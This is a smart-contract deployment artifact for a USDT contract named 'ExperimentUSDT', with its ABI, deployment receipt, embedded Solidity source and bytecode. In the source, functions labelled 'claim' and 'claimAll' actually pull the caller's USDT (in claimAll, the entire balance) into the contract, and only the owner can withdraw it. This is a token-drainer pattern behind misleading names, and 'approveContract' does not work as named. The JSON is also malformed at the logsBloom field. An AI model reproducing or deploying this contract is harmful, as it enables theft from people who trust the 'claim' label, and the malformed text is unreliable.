{
  "address": "0xd03359aAFaCC8aC1a2b9DcF4Da73F71Dc4d4d6F1",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_usdtAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "ApprovalSuccessful",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "TransferSuccessful",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "WithdrawSuccessful",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approveContract",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "checkAllowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "checkBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "claim",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claimAll",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getContractAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getUsdtAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFromUSDT",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdtToken",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "withdrawUSDT",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0xb976a6682364fd5fa2443187fbabe12d49303f0c4418be14c873a6018b6d144f",
  "receipt": {
    "to": null,
    "from": "0x7474ca70dC32bC25267Fc7F473b9eeB10f85286a",
    "contractAddress": "0xd03359aAFaCC8aC1a2b9DcF4Da73F71Dc4d4d6F1",
    "transactionIndex": 180,
    "gasUsed": "1112185",
    "logsBloom": "0x
    "blockHash": "0x78f5a6e74c18ff9935337d2e7006df27d9482eb97c3456d56365a8bc28bc9253",
    "transactionHash": "0xb976a6682364fd5fa2443187fbabe12d49303f0c4418be14c873a6018b6d144f",
    "logs": [
      {
        "transactionIndex": 180,
        "blockNumber": 6709565,
        "transactionHash": "0xb976a6682364fd5fa2443187fbabe12d49303f0c4418be14c873a6018b6d144f",
        "address": "0xd03359aAFaCC8aC1a2b9DcF4Da73F71Dc4d4d6F1",
        "topics": [
          "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
          "0x0000000000000000000000000000000000000000000000000000000000000000",
          "0x0000000000000000000000007474ca70dc32bc25267fc7f473b9eeb10f85286a"
        ],
        "data": "0x",
        "logIndex": 213,
        "blockHash": "0x78f5a6e74c18ff9935337d2e7006df27d9482eb97c3456d56365a8bc28bc9253"
      }
    ],
    "blockNumber": 6709565,
    "cumulativeGasUsed": "28894506",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x159C6238A6a4B463bdc549a057468b53F84c64fe"
  ],
  "numDeployments": 3,
  "solcInputHash": "1fc0e6a62b1fcba4d7dc362ac7521606",
  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_usdtAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ApprovalSuccessful\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TransferSuccessful\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"WithdrawSuccessful\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approveContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"checkAllowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"checkBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getContractAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getContractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getUsdtAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFromUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usdtToken\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdrawUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/donate.sol\":\"ExperimentUSDT\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xa94b34880e3c1b0b931662cb1c09e5dfa6662f31cba80e07c5ee71cd135c9673\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n}\\n\",\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"},\"contracts/donate.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.20;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ncontract ExperimentUSDT is Ownable {\\n    IERC20 public usdtToken;\\n\\n    event TransferSuccessful(address indexed from, address indexed to, uint256 amount);\\n    event WithdrawSuccessful(address indexed to, uint256 amount);\\n    event ApprovalSuccessful(address indexed owner, uint256 amount);\\n\\n    constructor(address _usdtAddress) {\\n        usdtToken = IERC20(_usdtAddress);\\n    }\\n\\n    function approveContract(uint256 amount) external {\\n        require(usdtToken.approve(address(this), amount), \\\"Approval failed\\\");\\n        emit ApprovalSuccessful(msg.sender, amount);\\n    }\\n\\n    function claim(uint256 amount) external {\\n        require(usdtToken.transferFrom(msg.sender, address(this), amount), \\\"Transfer failed\\\");\\n        emit TransferSuccessful(msg.sender, address(this), amount);\\n    }\\n\\n    function transferFromUSDT(uint256 amount) external {\\n        require(usdtToken.transfer(address(this), amount), \\\"Transfer failed\\\");\\n    }\\n\\n    function claimAll() external {\\n         require(usdtToken.transferFrom(msg.sender, address(this), usdtToken.balanceOf(msg.sender)), \\\"Transfer failed\\\");\\n    }\\n\\n    function withdrawUSDT(uint256 _amount) external onlyOwner {\\n        require(usdtToken.transfer(msg.sender, _amount), \\\"Withdrawal failed\\\");\\n        emit WithdrawSuccessful(msg.sender, _amount);\\n    }\\n\\n    function getContractBalance() external view returns (uint256) {\\n        return usdtToken.balanceOf(address(this));\\n    }\\n\\n    function checkAllowance(address owner, address spender) external view returns (uint256) {\\n        return usdtToken.allowance(owner, spender);\\n    }\\n\\n    function checkBalance(address account) external view returns (uint256) {\\n        return usdtToken.balanceOf(account);\\n    }\\n\\n    function getUsdtAddress() external view returns (address) {\\n        return address(usdtToken);\\n    }\\n\\n    function getContractAddress() external view returns (address){\\n        return address(this);\\n    }\\n    \\n}\",\"keccak256\":\"0x23f989ca4755a146469d9c26f4e89ae5a276d9a2476e74458cfef8aa2d822c93\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801562000010575f80fd5b506040516200143d3803806200143d8339818101604052810190620000369190620001ca565b620000566200004a6200009d60201b60201c565b620000a460201b60201c565b8060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050620001fa565b5f33905090565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f620001948262000169565b9050919050565b620001a68162000188565b8114620001b1575f80fd5b50565b5f81519050620001c4816200019b565b92915050565b5f60208284031215620001e257620001e162000165565b5b5f620001f184828501620001b4565b91505092915050565b61123580620002085f395ff3fe608060405234801561000f575f80fd5b50600436106100e8575f3560e01c8063715018a61161008a5780638da5cb5b116100645780638da5cb5b14610220578063a98ad46c1461023e578063d1058e591461025c578063f2fde38b14610266576100e8565b8063715018a6146101ca57806384f355d7146101d45780638b099b23146101f0576100e8565b80634b7dd8e6116100c65780634b7dd8e6146101425780635f5152261461016057806362c35c01146101905780636f9fb98a146101ac576100e8565b806332a2c5d0146100ec578063379607f51461010a5780633ea521ef14610126575b5f80fd5b6100f4610282565b6040516101019190610cf5565b60405180910390f35b610124600480360381019061011f9190610d45565b610289565b005b610140600480360381019061013b9190610d45565b6103ce565b005b61014a610502565b6040516101579190610cf5565b60405180910390f35b61017a60048036038101906101759190610d9a565b61052a565b6040516101879190610dd4565b60405180910390f35b6101aa60048036038101906101a59190610d45565b6105cb565b005b6101b46106f7565b6040516101c19190610dd4565b60405180910390f35b6101d2610796565b005b6101ee60048036038101906101e99190610d45565b6107a9565b005b61020a60048036038101906102059190610ded565b610887565b6040516102179190610dd4565b60405180910390f35b61022861092b565b6040516102359190610cf5565b60405180910390f35b610246610952565b6040516102539190610e86565b60405180910390f35b610264610977565b005b610280600480360381019061027b9190610d9a565b610aee565b005b5f30905090565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd3330846040518463ffffffff1660e01b81526004016102e793929190610e9f565b6020604051808303815f875af1158015610303573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103279190610f09565b610366576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161035d90610f8e565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fd6d3eb25a413c05d8107fc49deb2789bef7f612582b2482804c0b0423b6638ee836040516103c39190610dd4565b60405180910390a350565b6103d6610b70565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b8152600401610432929190610fac565b6020604051808303815f875af115801561044e573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104729190610f09565b6104b1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104a89061101d565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff167f84e742a3ea03623687a5febaa797636d728230721d4b3d1405d19fbbc16298d9826040516104f79190610dd4565b60405180910390a250565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231836040518263ffffffff1660e01b81526004016105859190610cf5565b602060405180830381865afa1580156105a0573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105c4919061104f565b9050919050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b330836040518363ffffffff1660e01b8152600401610627929190610fac565b6020604051808303815f875af1158015610643573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106679190610f09565b6106a6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161069d906110c4565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff167f51c52de2bb698de2bdcd26d7e1c47d6eec1c8348253da8afd9c62ed9a3dd1429826040516106ec9190610dd4565b60405180910390a250565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016107529190610cf5565b602060405180830381865afa15801561076d573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610791919061104f565b905090565b61079e610b70565b6107a75f610bee565b565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb30836040518363ffffffff1660e01b8152600401610805929190610fac565b6020604051808303815f875af1158015610821573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108459190610f09565b610884576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161087b90610f8e565b60405180910390fd5b50565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e84846040518363ffffffff1660e01b81526004016108e49291906110e2565b602060405180830381865afa1580156108ff573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610923919061104f565b905092915050565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd333060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231336040518263ffffffff1660e01b8152600401610a109190610cf5565b602060405180830381865afa158015610a2b573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a4f919061104f565b6040518463ffffffff1660e01b8152600401610a6d93929190610e9f565b6020604051808303815f875af1158015610a89573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610aad9190610f09565b610aec576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ae390610f8e565b60405180910390fd5b565b610af6610b70565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610b64576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5b90611179565b60405180910390fd5b610b6d81610bee565b50565b610b78610caf565b73ffffffffffffffffffffffffffffffffffffffff16610b9661092b565b73ffffffffffffffffffffffffffffffffffffffff1614610bec576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610be3906111e1565b60405180910390fd5b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b5f33905090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610cdf82610cb6565b9050919050565b610cef81610cd5565b82525050565b5f602082019050610d085f830184610ce6565b92915050565b5f80fd5b5f819050919050565b610d2481610d12565b8114610d2e575f80fd5b50565b5f81359050610d3f81610d1b565b92915050565b5f60208284031215610d5a57610d59610d0e565b5b5f610d6784828501610d31565b91505092915050565b610d7981610cd5565b8114610d83575f80fd5b50565b5f81359050610d9481610d70565b92915050565b5f60208284031215610daf57610dae610d0e565b5b5f610dbc84828501610d86565b91505092915050565b610dce81610d12565b82525050565b5f602082019050610de75f830184610dc5565b92915050565b5f8060408385031215610e0357610e02610d0e565b5b5f610e1085828601610d86565b9250506020610e2185828601610d86565b9150509250929050565b5f819050919050565b5f610e4e610e49610e4484610cb6565b610e2b565b610cb6565b9050919050565b5f610e5f82610e34565b9050919050565b5f610e7082610e55565b9050919050565b610e8081610e66565b82525050565b5f602082019050610e995f830184610e77565b92915050565b5f606082019050610eb25f830186610ce6565b610ebf6020830185610ce6565b610ecc6040830184610dc5565b949350505050565b5f8115159050919050565b610ee881610ed4565b8114610ef2575f80fd5b50565b5f81519050610f0381610edf565b92915050565b5f60208284031215610f1e57610f1d610d0e565b5b5f610f2b84828501610ef5565b91505092915050565b5f82825260208201905092915050565b7f5472616e73666572206661696c656400000000000000000000000000000000005f82015250565b5f610f78600f83610f34565b9150610f8382610f44565b602082019050919050565b5f6020820190508181035f830152610fa581610f6c565b9050919050565b5f604082019050610fbf5f830185610ce6565b610fcc6020830184610dc5565b9392505050565b7f5769746864726177616c206661696c65640000000000000000000000000000005f82015250565b5f611007601183610f34565b915061101282610fd3565b602082019050919050565b5f6020820190508181035f83015261103481610ffb565b9050919050565b5f8151905061104981610d1b565b92915050565b5f6020828403121561106457611063610d0e565b5b5f6110718482850161103b565b91505092915050565b7f417070726f76616c206661696c656400000000000000000000000000000000005f82015250565b5f6110ae600f83610f34565b91506110b98261107a565b602082019050919050565b5f6020820190508181035f8301526110db816110a2565b9050919050565b5f6040820190506110f55f830185610ce6565b6111026020830184610ce6565b9392505050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f20615f8201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b5f611163602683610f34565b915061116e82611109565b604082019050919050565b5f6020820190508181035f83015261119081611157565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f6111cb602083610f34565b91506111d682611197565b602082019050919050565b5f6020820190508181035f8301526111f8816111bf565b905091905056fea264697066735822122063f8c17a9a27dc17ba58a45852e7d2736756e1ee188144cc632a5290a613e51a64736f6c63430008140033",
  "deployedBytecode": "0x608060405234801561000f575f80fd5b50600436106100e8575f3560e01c8063715018a61161008a5780638da5cb5b116100645780638da5cb5b14610220578063a98ad46c1461023e578063d1058e591461025c578063f2fde38b14610266576100e8565b8063715018a6146101ca57806384f355d7146101d45780638b099b23146101f0576100e8565b80634b7dd8e6116100c65780634b7dd8e6146101425780635f5152261461016057806362c35c01146101905780636f9fb98a146101ac576100e8565b806332a2c5d0146100ec578063379607f51461010a5780633ea521ef14610126575b5f80fd5b6100f4610282565b6040516101019190610cf5565b60405180910390f35b610124600480360381019061011f9190610d45565b610289565b005b610140600480360381019061013b9190610d45565b6103ce565b005b61014a610502565b6040516101579190610cf5565b60405180910390f35b61017a60048036038101906101759190610d9a565b61052a565b6040516101879190610dd4565b60405180910390f35b6101aa60048036038101906101a59190610d45565b6105cb565b005b6101b46106f7565b6040516101c19190610dd4565b60405180910390f35b6101d2610796565b005b6101ee60048036038101906101e99190610d45565b6107a9565b005b61020a60048036038101906102059190610ded565b610887565b6040516102179190610dd4565b60405180910390f35b61022861092b565b6040516102359190610c